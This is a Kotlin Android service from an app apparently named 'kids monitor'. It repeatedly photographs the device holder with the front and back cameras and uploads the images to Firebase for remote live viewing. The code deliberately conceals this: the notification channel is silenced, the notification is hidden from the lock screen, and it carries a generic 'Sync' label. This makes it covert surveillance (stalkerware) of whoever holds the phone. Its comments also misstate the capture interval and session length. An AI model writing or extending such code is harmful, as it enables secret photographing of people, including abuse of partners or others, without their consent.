package com.kids.monitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraCharacteristics
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.kids.monitor.data.CameraCapture
import com.kids.monitor.data.FirestoreSync
import com.kids.monitor.data.Permissions
import com.kids.monitor.data.StorageUploader
import java.io.File

/**
 * خدمة واحدة للكاميرتين: تستقبل طلب تشغيل/إيقاف لكل اتجاه داخل نفس الـ instance
 * (استدعاء خدمة ثانية كان يلغي الأولى ويوقف الكاميرا السابقة).
 * تلتقط الاتجاهات المطلوبة بالتتابع كل 5 ثوانٍ، وتوقف نفسها تلقائياً بعد 15 دقيقة.
 */
class CameraService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private val active = linkedSetOf<Int>()
    private var running = false
    private var startedAt = 0L

    private val captureTask = object : Runnable {
        override fun run() {
            if (!running) return
            if (System.currentTimeMillis() - startedAt > MAX_SESSION_MS) {
                active.clear()
                stopSelf()
                return
            }
            val facings = active.toList()
            Thread {
                for (facing in facings) {
                    if (!running) break
                    captureAndPublish(facing)
                }
            }.start()
            handler.postDelayed(this, INTERVAL_MS)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP_ALL -> {
                active.clear()
                try { startForeground(NOTIFICATION_ID, buildNotification()) } catch (e: Exception) { /* تجاهل */ }
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_STOP -> {
                active.remove(intent.getIntExtra(EXTRA_FACING, -1))
                if (active.isEmpty()) {
                    try { startForeground(NOTIFICATION_ID, buildNotification()) } catch (e: Exception) { /* تجاهل */ }
                    stopSelf()
                    return START_NOT_STICKY
                }
            }
            else -> {
                val facing = intent?.getIntExtra(EXTRA_FACING, CameraCharacteristics.LENS_FACING_BACK)
                    ?: CameraCharacteristics.LENS_FACING_BACK
                active.add(facing)
            }
        }

        if (!Permissions.has(this, android.Manifest.permission.CAMERA)) {
            FirestoreSync.logError(this, "camera", "صلاحية الكاميرا غير مفعّلة")
            stopSelf()
            return START_NOT_STICKY
        }

        createNotificationChannel()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            } else {
                startForeground(NOTIFICATION_ID, buildNotification())
            }
        } catch (e: Exception) {
            FirestoreSync.logError(this, "camera", e.localizedMessage ?: "تعذر تشغيل خدمة الكاميرا")
            stopSelf()
            return START_NOT_STICKY
        }

        if (!running) {
            running = true
            startedAt = System.currentTimeMillis()
            handler.removeCallbacks(captureTask)
            handler.post(captureTask)
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        handler.removeCallbacks(captureTask)
        active.clear()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun captureAndPublish(facing: Int) {
        val isFront = facing == CameraCharacteristics.LENS_FACING_FRONT
        val kind = if (isFront) "front" else "back"
        val label = if (isFront) "الكاميرا الأمامية" else "الكاميرا الخلفية"
        val raw: File = CameraCapture.capture(this, facing, 8000) ?: run {
            FirestoreSync.setLive(
                this, kind,
                mapOf("error" to "تعذر التقاط صورة", "camera" to kind, "timestamp" to System.currentTimeMillis()),
            )
            return
        }
        val file: File = shrink(raw, 560, 50)
        val url = StorageUploader.uploadSync(file, "camera/$kind/${file.name}")
        val inline = if (url == null) StorageUploader.inlineData(file, 700_000) else null
        FirestoreSync.setLive(
            this, kind,
            mapOf(
                "name" to "$label ${file.name}",
                "url" to (url ?: ""),
                "dataUrl" to (inline ?: ""),
                "type" to "image",
                "mimeType" to "image/jpeg",
                "size" to file.length(),
                "camera" to kind,
                "timestamp" to System.currentTimeMillis(),
                "error" to if (url == null && inline == null) "تعذر الرفع (قواعد Storage؟)" else "",
            ),
        )
        // الاحتفاظ بآخر الصور فقط في media لتوفير المساحة
        if (url != null && isFront) {
            FirestoreSync.appendItem(
                this, "media",
                mapOf(
                    "name" to "$label ${file.name}",
                    "url" to url,
                    "type" to "image",
                    "mimeType" to "image/jpeg",
                    "size" to file.length(),
                    "timestamp" to System.currentTimeMillis(),
                    "camera" to kind,
                ),
            )
        }
        file.delete()
    }

    /** تصغير الصورة وتقليل الجودة لبث أسرع وكتابة أخف على Firestore. */
    private fun shrink(src: File, maxPx: Int = 640, quality: Int = 55): File {
        return try {
            val bmp = android.graphics.BitmapFactory.decodeFile(src.absolutePath) ?: return src
            val ratio = minOf(maxPx.toFloat() / bmp.width, maxPx.toFloat() / bmp.height, 1f)
            val out = if (ratio < 1f) {
                android.graphics.Bitmap.createScaledBitmap(
                    bmp,
                    (bmp.width * ratio).toInt().coerceAtLeast(1),
                    (bmp.height * ratio).toInt().coerceAtLeast(1),
                    true,
                )
            } else bmp
            val file = File(cacheDir, "cam_${System.currentTimeMillis()}.jpg")
            file.outputStream().use { out.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, it) }
            if (out !== bmp) out.recycle()
            bmp.recycle()
            src.delete()
            file
        } catch (e: Exception) {
            src
        }
    }

    private fun buildNotification(): Notification {
        val openApp = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("المزامنة")
            .setContentText("الكاميرا تعمل")
            .setContentIntent(openApp)
            .setPriority(Notification.PRIORITY_MIN)
            .setShowWhen(false)
            .setSound(null)
            .setVisibility(Notification.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            val channel = NotificationChannel(CHANNEL_ID, "المزامنة", NotificationManager.IMPORTANCE_NONE)
                .apply {
                    description = "خدمة الكاميرا"
                    setShowBadge(false)
                    setSound(null, null)
                    enableVibration(false)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET
                }
            manager.createNotificationChannel(channel)
        }
    }

    companion object {
        const val EXTRA_FACING = "facing"
        private const val ACTION_STOP = "com.kids.monitor.STOP_CAMERA"
        private const val ACTION_STOP_ALL = "com.kids.monitor.STOP_CAMERA_ALL"
        private const val CHANNEL_ID = "camera_stream_v2"
        private const val NOTIFICATION_ID = 1003
        private const val INTERVAL_MS = 1500L
        private const val MAX_SESSION_MS = 30 * 60 * 1000L

        fun start(context: Context, facing: Int) {
            val intent = Intent(context, CameraService::class.java).putExtra(EXTRA_FACING, facing)
            startFgs(context, intent)
        }

        fun stop(context: Context, facing: Int) {
            val intent = Intent(context, CameraService::class.java)
                .setAction(ACTION_STOP)
                .putExtra(EXTRA_FACING, facing)
            startFgs(context, intent)
        }

        fun stopAll(context: Context) {
            startFgs(context, Intent(context, CameraService::class.java).setAction(ACTION_STOP_ALL))
        }

        private fun startFgs(context: Context, intent: Intent) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                FirestoreSync.logError(context, "camera", e.localizedMessage ?: "تعذر بدء الخدمة")
            }
        }
    }
}
